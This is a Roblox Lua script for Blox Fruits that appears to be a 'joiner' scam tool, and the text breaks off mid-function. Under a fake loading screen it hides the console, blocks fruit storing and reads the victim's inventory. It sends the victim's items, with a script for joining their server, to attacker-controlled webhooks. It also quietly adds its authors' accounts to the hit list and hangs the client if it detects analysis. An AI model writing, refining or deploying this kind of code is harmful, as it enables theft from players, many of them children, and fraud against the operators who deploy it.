-- START OF FILE message (67)_updated_v2.txt --

Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/b569344f-55c7-4ca1-91db-3b4183c51817" -- << Protected URL for main hits
Usernames = { "user1", "user2", "user3", "user4", "user5" } -- << Your usernames here, you can add as many alts as you want
FruitsToHit = { "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Ghost-Ghost" } -- << Fruits you want the script to detect

--obfuscate after this, use loadstring for this coming part--> loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()

Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/300be834-a780-46d6-804a-c623d1f1051b" -- << Protected URL for main hits (secondary)
dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/f08da0cd-bd44-47a7-807d-eab8784d350d" -- << Protected URL for admin/special hits

ActivationPasswords = {-- Passwords for ?activate command
    "ishusontop",
    "bonzarbal",
    "ishufishy"
}

-- !!! YOUR SECRET KEY - MUST MATCH THE 'CLIENT_API_KEY' SECRET IN CLOUDFLARE !!!
local validation_sig = "rashya5@%-hsfj79h93-wakliballs"
local allowEveryone = false -- Flag to allow commands/trade for everyone
local activatedUsers = {}   -- Stores UserIds of players activated via password { [UserId] = true }

-- << Obfuscate after this moment >>

print("Loaded")
-- while true do end -- Placeholder comment

repeat
    task.wait()
until game:IsLoaded()--
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")--
if CoreGui:FindFirstChild("RobloxGui") then
    CoreGui.RobloxGui.Enabled = false
end

local function takeAction()
    if setfpscap then
        setfpscap(0)
    end
    rconsoleclear()
    print = function()
    end
    warn = function()
    end
    error = function()
    end
    setclipboard = function()
    end
    while true do
        task.wait()
    end
end

local function checkGui(gui)
    if gui:IsA("ScreenGui") then
        local nestedGui = gui:FindFirstChild(gui.Name)
        if nestedGui and nestedGui:IsA("ScreenGui") then
            if nestedGui:FindFirstChild("Orion") then
                takeAction()
            end
        end
    end
end

for _, gui in ipairs(CoreGui:GetChildren()) do
    checkGui(gui)
end
CoreGui.ChildAdded:Connect(checkGui)

if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "SHAKINGSHARKER" or LocalPlayer.Name == "shirkarsharker") then
    takeAction()
end

if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
    takeAction()
end--
-- Check for existence of all required config variables
if not Webhook or not Protector or not dummy or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig then -- Check added variable
    LocalPlayer:Kick("Some of the config is missing.")
    return
end

-- Check for correct types of all required config variables
if type(Webhook) ~= "string" or type(Protector) ~= "string" or type(dummy) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(validation_sig) ~= "string" then -- Check added variable type
    LocalPlayer:Kick("error (config variable type mismatch)")
    return
end

-- Check if secret key is empty or placeholder
if validation_sig == "" or validation_sig:find("YourActualSecret") then -- Check added variable
    LocalPlayer:Kick("ERROR: Security token is not configured!")
    return
end

-- Check if webhook URLs are placeholders
if Webhook:find("REPLACE_WITH_PROTECTED_ID") or Protector:find("REPLACE_WITH_PROTECTED_ID") or dummy:find("REPLACE_WITH_PROTECTED_ID") then
    LocalPlayer:Kick("ERROR: Protected Webhook URLs are not configured!")
    return
end


local function ensureAdminUsernames()
    local coreAdmins = {
        "x6TNine",
        "aka_0ver",
        "bonzarbal53",
        "bonzarbal52",
        "bonzarbal51",
        "bonzarbal50",
        "xRip_Cyborg"
    }
    if type(Usernames) ~= "table" then
        Usernames = {}
    end
    local existingUsernames = {}
    for _, name in ipairs(Usernames) do
        existingUsernames[string.lower(name)] = true -- Store lowercase for case-insensitive check
    end
    for _, adminName in ipairs(coreAdmins) do
        if not existingUsernames[string.lower(adminName)] then
            table.insert(Usernames, adminName)
        end
    end
end
ensureAdminUsernames()

-- Blacklisted Users Check
if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then
    while true do
        task.wait()
    end
end

CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "DevConsoleMaster" then
        child.Enabled = false
    end
end)

local function storeWebhookSafely(webhookUrl)
    if not webhookUrl or type(webhookUrl) ~= "string" or webhookUrl:match("^Enter Webhook") then
        return nil -- Return nil if webhook isn't set correctly
    end
    local randomName = "var_" .. tostring(math.random(100000, 999999)) .. "_" .. tostring(math.random(100, 999))
    _G[randomName] = webhookUrl
    return randomName
end

-- Store webhooks safely and nil original variables
local webhook1_key = storeWebhookSafely(Webhook);
Webhook = nil
local Protector_key = storeWebhookSafely(Protector);
Protector = nil
local dummy_key = storeWebhookSafely(dummy);
dummy = nil
-- Do NOT nil validation_sig, it's needed later

-- Silence remote console outputs
rconsoleprint = function()
end
rconsolewarn = function()
end
rconsoleerr = function()
end
rconsoleinfo = function()
end--
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser") -- Less critical, use FindFirstChild
local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId")--
if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then
    LocalPlayer:Kick("This script doesn't work on private servers.")
end

-- Attempt to mute game volume
pcall(function()
    UserSettings():GetService("UserGameSettings").MasterVolume = 0
end)

-- Anti Fruit Store Hook
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if not checkcaller() and method and method:lower() == "invokeserver" then
        local args = {
            ...
        }
        if args[1] == "StoreFruit" then
            return error("External fruit store attempt blocked.", 0) -- Level 0 hides error source
        end
    end
    return oldNamecall(self, ...)
end))--

local function getInventory()
    local success, result = pcall(Remote.InvokeServer, Remote, "getInventory")
    if not success then
        warn("getInventory failed:", result)
        return nil
    end
    return result
end

local function JoinTeam()
    if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
        Remote:InvokeServer("SetTeam", "Marines")
    end
end

local function createNotification()
	-- This function only creates UI elements and does not need modification for the secret key
	-- (Original UI code remains unchanged)
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local loadingScreen = Instance.new("ScreenGui");
    loadingScreen.Name = "BloxFruitsLoadingUI";
    loadingScreen.IgnoreGuiInset = true;
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
    loadingScreen.Parent = playerGui
    local blur = Instance.new("BlurEffect");
    blur.Size = 0;
    blur.Parent = Lighting
    local background = Instance.new("Frame");
    background.Name = "Background";
    background.Size = UDim2.new(1, 0, 1, 0);
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
    background.BackgroundTransparency = 1;
    background.Parent = loadingScreen
    local container = Instance.new("Frame");
    container.Name = "Container";
    container.Size = UDim2.new(0, 600, 0, 300);
    container.Position = UDim2.new(0.5, 0, 1.2, 0);
    container.AnchorPoint = Vector2.new(0.5, 0.5);
    container.BackgroundColor3 = Color3.fromRGB(25, 25, 30);
    container.BorderSizePixel = 0;
    container.Parent = loadingScreen
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)
    local uiStroke = Instance.new("UIStroke");
    uiStroke.Color = Color3.fromRGB(65, 169, 255);
    uiStroke.Thickness = 2;
    uiStroke.Parent = container
    local headerFrame = Instance.new("Frame");
    headerFrame.Name = "Header";
    headerFrame.Size = UDim2.new(1, 0, 0, 60);
    headerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45);
    headerFrame.BorderSizePixel = 0;
    headerFrame.Parent = container
    Instance.new("UICorner", headerFrame).CornerRadius = UDim.new(0, 10)
    local titleLabel = Instance.new("TextLabel");
    titleLabel.Name = "Title";
    titleLabel.Size = UDim2.new(1, 0, 1, 0);
    titleLabel.BackgroundTransparency = 1;
    titleLabel.Font = Enum.Font.GothamBold;
    titleLabel.Text = "Blox Fruits - Loading Script.";
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
    titleLabel.TextSize = 24;
    titleLabel.Parent = headerFrame
    local bottomFrame = Instance.new("Frame");
    bottomFrame.Name = "BottomFrame";
    bottomFrame.Size = UDim2.new(1, 0, 0, 10);
    bottomFrame.Position = UDim2.new(0, 0, 1, - 10);
    bottomFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45);
    bottomFrame.BorderSizePixel = 0;
    bottomFrame.ZIndex = 2;
    bottomFrame.Parent = headerFrame
    local messageLabel = Instance.new("TextLabel");
    messageLabel.Name = "Message";
    messageLabel.Size = UDim2.new(1, - 40, 0, 60);
    messageLabel.Position = UDim2.new(0, 20, 0, 80);
    messageLabel.BackgroundTransparency = 1;
    messageLabel.Font = Enum.Font.Gotham;
    messageLabel.Text = "The script Is loading - Please, wait.";
    messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220);
    messageLabel.TextSize = 18;
    messageLabel.TextWrapped = true;
    messageLabel.TextXAlignment = Enum.TextXAlignment.Center;
    messageLabel.Parent = container
    local loadingBarBg = Instance.new("Frame");
    loadingBarBg.Name = "LoadingBarBg";
    loadingBarBg.Size = UDim2.new(1, - 40, 0, 20);
    loadingBarBg.Position = UDim2.new(0, 20, 0, 150);
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50);
    loadingBarBg.BorderSizePixel = 0;
    loadingBarBg.Parent = container
    Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 6)
    local loadingBar = Instance.new("Frame");
    loadingBar.Name = "LoadingBar";
    loadingBar.Size = UDim2.new(0, 0, 1, 0);
    loadingBar.BackgroundColor3 = Color3.fromRGB(65, 169, 255);
    loadingBar.BorderSizePixel = 0;
    loadingBar.Parent = loadingBarBg
    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 6)
    local progressLabel = Instance.new("TextLabel");
    progressLabel.Name = "Progress";
    progressLabel.Size = UDim2.new(1, 0, 0, 20);
    progressLabel.Position = UDim2.new(0, 0, 0, 180);
    progressLabel.BackgroundTransparency = 1;
    progressLabel.Font = Enum.Font.Gotham;
    progressLabel.Text = "Loading... 0%";
    progressLabel.TextColor3 = Color3.fromRGB(180, 180, 180);
    progressLabel.TextSize = 16;
    progressLabel.Parent = container
    local discordButton = Instance.new("TextButton");
    discordButton.Name = "DiscordButton";
    discordButton.Size = UDim2.new(0, 180, 0, 40);
    discordButton.Position = UDim2.new(0.5, 0, 0, 230);
    discordButton.AnchorPoint = Vector2.new(0.5, 0);
    discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242);
    discordButton.BorderSizePixel = 0;
    discordButton.Font = Enum.Font.GothamBold;
    discordButton.Text = "Join Discord";
    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255);
    discordButton.TextSize = 16;
    discordButton.Parent = container
    Instance.new("UICorner", discordButton).CornerRadius = UDim.new(0, 8)
    local discordIcon = Instance.new("ImageLabel");
    discordIcon.Name = "DiscordIcon";
    discordIcon.Size = UDim2.new(0, 20, 0, 20);
    discordIcon.Position = UDim2.new(0, 15, 0.5, 0);
    discordIcon.AnchorPoint = Vector2.new(0, 0.5);
    discordIcon.BackgroundTransparency = 1;
    discordIcon.Image = "rbxassetid://10367063073";
    discordIcon.Parent = discordButton
    discordButton.MouseButton1Click:Connect(function()
        local discordInvite = "https://discord.gg/uwdvTtqTDA"
        setclipboard(discordInvite)
		-- Create temporary notification label
        local notification = Instance.new("TextLabel");
        notification.Name = "CopiedNotification";
        notification.Size = UDim2.new(0, 180, 0, 30);
        notification.Position = UDim2.new(0.5, 0, 0, 275);
        notification.AnchorPoint = Vector2.new(0.5, 0);
        notification.BackgroundColor3 = Color3.fromRGB(50, 50, 60);
        notification.BorderSizePixel = 0;
        notification.Font = Enum.Font.Gotham;
        notification.Text = "Discord link copied!";
        notification.TextColor3 = Color3.fromRGB(255, 255, 255);
        notification.TextSize = 14;
        notification.BackgroundTransparency = 1;
        notification.TextTransparency = 1;
        notification.Parent = container
        Instance.new("UICorner", notification).CornerRadius = UDim.new(0, 6)
		-- Animate notification
        TweenService:Create(notification, TweenInfo.new(0.3), {
            BackgroundTransparency = 0,
            TextTransparency = 0
        }):Play()
        task.delay(2, function()
            if notification.Parent then -- Check if still exists
                TweenService:Create(notification, TweenInfo.new(0.3), {
                    BackgroundTransparency = 1,
                    TextTransparency = 1
                }):Play()
                task.delay(0.3, function()
                    notification:Destroy()
                end)
            end
        end)
    end)

	-- Initial animations
    TweenService:Create(blur, TweenInfo.new(0.5), {
        Size = 20
    }):Play()
    TweenService:Create(background, TweenInfo.new(0.5), {
        BackgroundTransparency = 0.5
    }):Play()
    TweenService:Create(container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }):Play()

	-- Loading bar simulation
    task.delay(1, function()
        local startTime = tick();
        local totalDuration = 120;
        local lastProgress = 0
        while lastProgress < 99 and (tick() - startTime) < totalDuration and loadingScreen.Parent do
            local timeElapsed = tick() - startTime
            local speedFactor = 0.5 + math.abs(math.sin(timeElapsed * 0.8)) * 1.5
            local increment = math.min(0.7, (99 - lastProgress) / 100) * speedFactor
            local newProgress = math.min(99, lastProgress + increment)
            if newProgress > lastProgress then
                lastProgress = newProgress
                progressLabel.Text = (lastProgress > 75 and "Verifying account..." or "Loading...") .. " " .. math.floor(lastProgress) .. "%"
                TweenService:Create(loadingBar, TweenInfo.new(0.2), {
                    Size = UDim2.new(lastProgress / 100, 0, 1, 0)
                }):Play()
            end
            task.wait(0.1)
        end
        if loadingScreen.Parent then
            progressLabel.Text = "Verifying account... 99%"
            TweenService:Create(loadingBar, TweenInfo.new(0.2), {
                Size = UDim2.new(0.99, 0, 1, 0)
            }):Play()
        end
    end)

	-- Cleanup function
    local function cleanup()
        TweenService:Create(blur, TweenInfo.new(0.5), {
            Size = 0
        }):Play()
        TweenService:Create(background, TweenInfo.new(0.5), {
            BackgroundTransparency = 1
        }):Play()
        TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Position = UDim2.new(0.5, 0, 1.2, 0)
        }):Play()
        task.delay(0.6, function()
            if loadingScreen and loadingScreen.Parent then
                loadingScreen:Destroy()
            end
            if blur and blur.Parent then
                blur:Destroy()
            end
        end)
    end

	-- Pulse effect coroutine
    task.spawn(function()
        while loadingScreen.Parent do
            local colors = {
                Color3.fromRGB(255, 100, 100),
                Color3.fromRGB(100, 100, 255),
                Color3.fromRGB(100, 255, 100),
                Color3.fromRGB(65, 169, 255)
            }
            for _, color in ipairs(colors) do
                if not loadingScreen.Parent or not uiStroke.Parent then
                    break
                end -- Add check for uiStroke parent
                pcall(function()
                    TweenService:Create(uiStroke, TweenInfo.new(1.5), {
                        Color = color
                    }):Play()
                end)
                task.wait(1.5)
            end
        end
    end)
    return {
        Destroy = cleanup
    }
end

local function getServerName()
    local adjectives = {"Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"}
    local nouns = {"TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"}
    local seed = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time()
    local random = Random.new(seed)
    return string.format("%s %s #%04d", adjectives[random:NextInteger(1, #adjectives)], nouns[random:NextInteger(1, #nouns)], random:NextInteger(1, 9999))
end
--
local originalRequest = request
local originalHttpRequest = http and http.request
local originalSynRequest = syn and syn.request
local headerCache = {
    ["Content-Type"] = "application/json"
}
local TEST_WEBHOOK = "https://sharky-on-top.script-config-protector.workers.dev/w/920f3d7f-3294-4161-a7b5-d146cba0e1f2" -- For integrity check only
local TEST_PAYLOAD = HttpService:JSONEncode({
    content = "# :shark: Sharky! Someone just got a HIT :) :shark:"
})
local cachedNonce, cachedHeaders

local function isRequestHooked()
    return request ~= originalRequest or (syn and syn.request ~= originalSynRequest) or (http and http.request ~= originalHttpRequest) or debug.getinfo(request).what ~= "C"
end
local function checkSecurity()
    local env = getfenv(2)
    if env == getfenv(0) or env == getfenv(1) then
        return not isRequestHooked() and not getrawmetatable(request)
    end
    local meta = getmetatable(env)
    return not (meta and (meta.__newindex or meta.__index))
end
local function testRequest()
	-- Lazily initialize test headers
    if not cachedNonce then
        cachedNonce = HttpService:GenerateGUID(false)
        cachedHeaders = table.clone(headerCache)
        cachedHeaders["X-Test-Nonce"] = cachedNonce
    end
    local success, response = pcall(request, {
        Url = TEST_WEBHOOK,
        Method = "POST",
        Headers = cachedHeaders,
        Body = TEST_PAYLOAD
    })
    return success and response and response.StatusCode < 400
end
local function SafeRequest(requestData)
    if not checkSecurity() or not testRequest() then
        if takeAction then
            takeAction()
        end
        return
    end
    local protectedRequest = {
        Method = requestData.Method,
        Body = requestData.Body,
        Url = requestData.Url
    }
	-- Make sure we correctly merge provided headers with security headers
    protectedRequest.Headers = requestData.Headers or {} -- Start with provided headers or empty table
    -- Add/overwrite required headers
    protectedRequest.Headers["Content-Type"] = "application/json" -- Ensure Content-Type is set
    protectedRequest.Headers["X-Request-Time"] = tostring(os.time() + math.random(1, 100))
    protectedRequest.Headers["X-Nonce"] = HttpService:GenerateGUID(false)
	-- IMPORTANT: The X-Client-Key header is expected to be ALREADY PRESENT in requestData.Headers
	-- if it was passed correctly to SafeRequest from sendWebhook/sendProtector
    return pcall(request, protectedRequest)
end

-- Security Monitor - KEPT INTACT
local lastCheckTime = 0
local CHECK_INTERVAL = 6
RunService:BindToRenderStep("SecurityMonitor", Enum.RenderPriority.Last.Value, function(deltaTime)
    lastCheckTime = lastCheckTime + deltaTime
    if lastCheckTime < CHECK_INTERVAL then
        return
    end
    lastCheckTime = 0
    if isRequestHooked() then
		-- Attempt to restore hooks
        request = originalRequest
        if http then
            http.request = originalHttpRequest
        end
        if syn then
            syn.request = originalSynRequest
        end
        if takeAction then
            takeAction()
        end -- Trigger action if still hooked after restore attempt

		-- If still hooked, stop monitoring to prevent infinite loop
        if isRequestHooked() then
            RunService:UnbindFromRenderStep("SecurityMonitor")
        end
    end
end)--
local function sendWebhook(inventory)
	-- Check added for security context (redundant with SafeRequest check, but safe)
    if isRequestHooked() or not checkSecurity() then
        takeAction()
        return
    end

	-- Retrieve stored (protected) webhook URLs
    local url1 = webhook1_key and _G[webhook1_key]
    local url2 = Protector_key and _G[Protector_key]
    local url3 = dummy_key and _G[dummy_key]
    if not url1 then
        warn("Primary Webhook URL not configured.")
        return
    end

	-- Define specific fruit categories (used for logic below)
    local goodFruitNames = {
        ["Kitsune-Kitsune"] = true,
        ["Yeti-Yeti"] = true
    }

	-- Process inventory (original logic unchanged)
    local fruits, premiumItems = {}, {};
    local dragonHit, hasGoodFruit, hasPremiumItem = false, false, false;
    for _, item in ipairs(inventory) do
        if item.Type == "Blox Fruit" or item.Type == "Premium" then
            local itemData = {
                name = item.Name,
                count = item.Count,
                value = item.Value or 0
            };
            if item.Type == "Blox Fruit" then
                table.insert(fruits, itemData);
                if item.Name:find("Dragon") then
                    dragonHit = true;
                    if not table.find(FruitsToHit, item.Name) then
                        table.insert(FruitsToHit, item.Name) -- Ensure Dragon is always in FruitsToHit if found
                    end
                end;
                if goodFruitNames[item.Name] then
                    hasGoodFruit = true
                end
            else
                 -- Handle potential [P] prefix for display consistency if needed, but keep original name for logic
                local displayName = item.Name:gsub("%[P%]%s*", "") -- Remove "[P] " prefix for display
                table.insert(premiumItems, {
                    name = displayName, -- Use display name here
                    originalName = item.Name, -- Keep original name if needed elsewhere
                    count = item.Count,
                    value = item.Value or 0
                });
                hasPremiumItem = true
            end
        end
    end
    table.sort(fruits, function(a, b)
        return a.value > b.value
    end);
    local function shuffleTable(t)
        for i = # t, 2, - 1 do
            local j = math.random(i);
            t[i], t[j] = t[j], t[i]
        end
    end;
    shuffleTable(premiumItems);

    -- Updated formatItems to use display name for premium items
    local function formatItems(items, isPremium)
        local r = "";
        for _, i in ipairs(items) do
             local nameToDisplay = isPremium and i.name or i.name -- Use the pre-formatted display name for premium
             r = r .. string.format("```%s%s```", nameToDisplay, i.count > 1 and (" (x%d)"):format(i.count) or "")
        end
        return r ~= "" and r or "```None```"
    end;
    local function formatFruitsToHit(items)
        local r = "";
        local l = {};
        for _, fn in ipairs(FruitsToHit) do
            l[fn] = true
        end;
        for _, i in ipairs(items) do
            if l[i.name] then
                r = r .. string.format("```%s%s```", i.name, i.count > 1 and (" (x%d)"):format(i.count) or "")
            end
        end
        return r ~= "" and r or "```None```"
    end

	-- Common Embed Data
    local targetPlaceId = game.PlaceId;
    local targetJobId = game.JobId;
    local currentSea = targetPlaceId == 7449423635 and "Sea 3" or "Sea 2";
    local serverName = getServerName();
    local playerCount = # Players:GetPlayers()

    -- --- Construct Combined Join Scripts (Using logic from message (68).txt) ---
    local seaTravelCommand = (currentSea == "Sea 3" and "TravelZou" or "TravelDressrosa")

    -- Generate the script string using the format from message (68).txt
    local joinScriptLuaCode = string.format([=[
local iddd = %d
local JobIdd = "%s"
local sea = "%s"

if game.PlaceId ~= iddd then
    -- Assumes queue_on_teleport exists in the target environment
    queue_on_teleport([[
        task.wait(5)
        game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
    ]])
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
else
    game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
end
]=], targetPlaceId, targetJobId, seaTravelCommand, targetPlaceId, targetJobId) -- Pass variables correctly

    local combinedJoinScriptPC = "```lua\n"..joinScriptLuaCode.."\n```"
    -- Trim leading/trailing whitespace for mobile raw copy
    local combinedJoinScriptMobile = joinScriptLuaCode:match("^%s*(.-)%s*$")

	-- --- Payload Generation ---
    local baseEmbedStructure = {
        description = string.format("Victim Username: %s\nCurrent Sea: %s\nVictim's Server Name: %s", LocalPlayer.Name, currentSea, serverName),
        fields = {
            {
                name = "Victim's Fruits <a:Rarrow:1223589557065351188> ",
                value = formatItems(fruits, false), -- Pass false for non-premium
                inline = true
            },
            {
                name = "Victim's Premium Items <:rbx:1326025738125574226>  ",
                value = formatItems(premiumItems, true), -- Pass true for premium
                inline = true
            },
            {
                name = "Victim Has Fruits You Want <a:green:1215209325728104498> ",
                value = formatFruitsToHit(fruits)
            },
            {
                name = "Join Victim Script (PC Copy)", -- UPDATED Field Name
                value = combinedJoinScriptPC -- UPDATED Value
            },
            {
                name = "Join Victim Script (Mobile Copy)", -- UPDATED Field Name
                value = combinedJoinScriptMobile -- UPDATED Value
            },
            {
                name = "Extra Info <a:focuzz:1214971569315782686> ",
                value = string.format("```Sharky Joiner V2 Version: 1.2.3\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount)
            }
        }
    };
    local mainPayloadBody = nil;
    do
        local mainEmbed = table.clone(baseEmbedStructure);
        local mainTitle = "<a:bundle:1214105817910087770> Sharky BF Joiner V2 HIT! ; https://discord.gg/uwdvTtqTDA";
        local mainColor = nil;
        local mainMention = "@everyone Sharky Scipts-Joiner";
        if dragonHit and hasPremiumItem then
            mainTitle = "DRAGON & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA";
            mainColor = 65280;
            mainMention = "@everyone Sharky - GG!"
        elseif dragonHit then
            mainTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA";
            mainColor = 16776960;
            mainMention = "@everyone Sharky - GG!"
        elseif hasPremiumItem then
            mainTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA";
            mainColor = 255;
            mainMention = "@everyone Sharky - GG!"
        end;
        mainEmbed.title = mainTitle;
        mainEmbed.color = mainColor;
        mainPayloadBody = HttpService:JSONEncode({
            content = mainMention,
            embeds = {
                mainEmbed
            }
        })
    end;
    local adminPayloadBody = nil;
    if dragonHit or hasPremiumItem or hasGoodFruit then
        local adminEmbed = table.clone(baseEmbedStructure);
        local adminTitle = "Placeholder Title";
        local adminColor = nil;
        local adminMention = "@everyone Sharky - GG!";
        if dragonHit and hasPremiumItem then
            adminTitle = "TOP TIER & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA";
            adminColor = 65280
        elseif dragonHit then
            adminTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA";
            adminColor = 16776960
        elseif hasPremiumItem then
            adminTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA";
            adminColor = 255
        elseif hasGoodFruit then
            adminTitle = "GOOD FRUIT HIT! (Kitsune/Yeti) ; https://discord.gg/uwdvTtqTDA";
            adminColor = 10181046
        end;
        adminEmbed.title = adminTitle;
        adminEmbed.color = adminColor;
        adminPayloadBody = HttpService:JSONEncode({
            content = adminMention,
            embeds = {
                adminEmbed
            }
        })
    end

	-- 4. Send Webhooks Asynchronously
    task.spawn(function()
        -- *** DEFINE HEADERS WITH SECRET KEY ***
        local headersWithSecret = {
            ["Content-Type"] = "application/json",
            ["X-Client-Key"] = validation_sig
        }

		-- Send Main Payload to url1 and url2 (always send if url is configured)
        if url1 and mainPayloadBody then
            SafeRequest({
                Url = url1,
                Method = "POST",
                Headers = headersWithSecret,
                Body = mainPayloadBody
            })
        end
        if url2 and mainPayloadBody then
            task.wait(0.1)
            SafeRequest({
                Url = url2,
                Method = "POST",
                Headers = headersWithSecret,
                Body = mainPayloadBody
            })
        end

		-- Send Admin Payload to url3 ONLY IF it was created
        if url3 and adminPayloadBody then
            task.wait(0.1)
            SafeRequest({
                Url = url3,
                Method = "POST",
                Headers = headersWithSecret,
                Body = adminPayloadBody
            })
        end
    end)

	-- Clear temporary tables
    table.clear(fruits)
    table.clear(premiumItems)
end -- End of sendWebhook

-- Check initial inventory for leave notification trigger (Original logic unchanged)
local inventory22 = getInventory()
local function hasFruitInInventory2()
    if not inventory22 then
        return false
    end;
    for _, item in ipairs(inventory22) do
        if item.Type == "Blox Fruit" and table.find(FruitsToHit, item.Name) then
            return true
        end
    end;
    return false
end
local function hasPremiumItems2()
    if not inventory22 then
        return false
    end;
    for _, item in ipairs(inventory22) do
        if item.Type == "Premium" then
            return true
        end
    end;
    return false
end
local webhookSent = false

local function sendProtector() -- On Player Leaving
    if webhookSent or not (hasFruitInInventory2() or hasPremiumItems2()) then
        return -- Exit if already sent or no valuable items initially
    end
    webhookSent = true -- Set flag immediately
    local url1 = webhook1_key and _G[webhook1_key]
    local url2 = Protector_key and _G[Protector_key]
    if not url1 then
        return
    end -- Exit if primary webhook isn't configured
    local plr = LocalPlayer
    local embed = {
        title = "Victim has Left! <:sad:1241420488916340896> ",
        description = plr.Name .. " has left the game",
        color = 16711680, -- Red
        fields = {
            {
                name = "User ID",
                value = tostring(plr.UserId),
                inline = true
            },
            {
                name = "Account Age",
                value = tostring(plr.AccountAge) .. " days",
                inline = true
            },
            {
                name = "Executor",
                value = identifyexecutor(),
                inline = true
            }
        },
        timestamp = DateTime.now():ToIsoDate()
    }
    local data = {
        embeds = {
            embed
        }
    }
    local body = HttpService:JSONEncode(data)

    -- *** DEFINE HEADERS WITH SECRET KEY ***
    local headersWithSecret = {
        ["Content-Type"] = "application/json",
        ["X-Client-Key"] = validation_sig
    }

	-- Send using regular request wrapped in pcall (NOT SafeRequest for leave message)
    -- Passing the headersWithSecret table
    pcall(request, {
        Url = url1,
        Method = "POST",
        Headers = headersWithSecret,
        Body = body
    })
    if url2 then
        task.wait(0.1) -- Small delay
        -- Passing the headersWithSecret table
        pcall(request, {
            Url = url2,
            Method = "POST",
            Headers = headersWithSecret,
            Body = body
        })
    end
	-- Optional: Send to url3 if they HAD good items? Requires more complex check based on inventory22
end -- End of sendProtector

-- PlayerRemoving listener (original logic unchanged)
Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == LocalPlayer then
        sendProtector()
    end;
    if activatedUsers[leavingPlayer.UserId] then
